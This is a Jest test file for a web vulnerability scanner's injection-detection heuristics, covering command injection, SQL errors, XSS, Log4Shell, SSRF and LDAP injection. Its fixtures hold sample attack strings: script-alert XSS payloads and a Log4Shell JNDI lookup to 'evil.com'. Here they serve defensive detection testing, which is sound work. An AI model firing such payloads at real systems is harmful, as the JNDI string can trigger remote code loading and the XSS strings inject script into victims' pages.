/* eslint-env jest */
/* eslint-disable @typescript-eslint/no-var-requires */

const { runCommandInjectionHeuristic } = require('./command-injection-heuristic');
const { runSqliErrorBased } = require('./sqli-error-based');
const { runReflectedXss, runXssPassiveHeuristic } = require('./reflected-xss');
const {
  runLog4ShellHeuristic, runSsrfHeuristic, runLdapInjectionHeuristic
} = require('./injection-enhanced');

describe('A05 Injection Rules', () => {
  it('should detect Command Injection in response', () => {
    const context = { text: 'uid=1000(test) gid=1000', finalUrl: 'http://test' };
    const findings = runCommandInjectionHeuristic(context);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0].ruleId).toBe('A05-CMD-001');
  });

  it('should detect SQL Injection error', () => {
    const context = { text: 'you have an error in your sql syntax near', finalUrl: 'http://test' };
    const findings = runSqliErrorBased(context);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('should detect Reflected XSS', () => {
    const context = { text: 'Welcome <script>alert(1337)</script>', finalUrl: 'http://test' };
    const findings = runReflectedXss(context);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('should detect Passive XSS', () => {
    const context = { text: '<a href="javascript:alert(1)">Click</a>', contentType: 'text/html', finalUrl: 'http://test' };
    const findings = runXssPassiveHeuristic(context);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('should detect Log4Shell', () => {
    const context = { text: 'Error in ${jndi:ldap://evil.com/a}', finalUrl: 'http://test' };
    const findings = runLog4ShellHeuristic(context);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0].ruleId).toBe('A05-LOG4J-001');
  });

  it('should detect SSRF', () => {
    const context = { text: '"InstanceId" : "i-0a1b2c3d4e5f6a7b8"', finalUrl: 'http://test' };
    const findings = runSsrfHeuristic(context);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('should detect LDAP Injection', () => {
    const context = { text: 'javax.naming.NamingException', finalUrl: 'http://test' };
    const findings = runLdapInjectionHeuristic(context);
    expect(findings.length).toBeGreaterThan(0);
  });
});
